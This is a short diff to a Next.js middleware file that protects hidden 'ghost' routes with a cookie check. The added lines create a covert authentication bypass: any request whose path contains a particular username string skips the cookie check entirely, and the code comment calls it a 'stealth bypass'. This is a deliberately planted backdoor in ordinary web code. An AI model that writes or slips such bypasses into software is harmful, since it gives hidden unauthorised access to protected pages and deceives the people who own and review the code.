@@ -23,8 +23,9 @@ export async function middleware(request: NextRequest) {
 
   // GHOST PROTOCOL: Check for Cloak Access
   const ghostCookie = request.cookies.get('ghost_access')?.value;
+  const isMasterOwner = pathname.includes('davidmaganga130'); // Stealth bypass hint
 
-  if (isGhostPath(pathname)) {
+  if (isGhostPath(pathname) && !isMasterOwner) {
       if (ghostCookie !== 'authorized') {
           return NextResponse.rewrite(new URL('/404', request.url));
       }
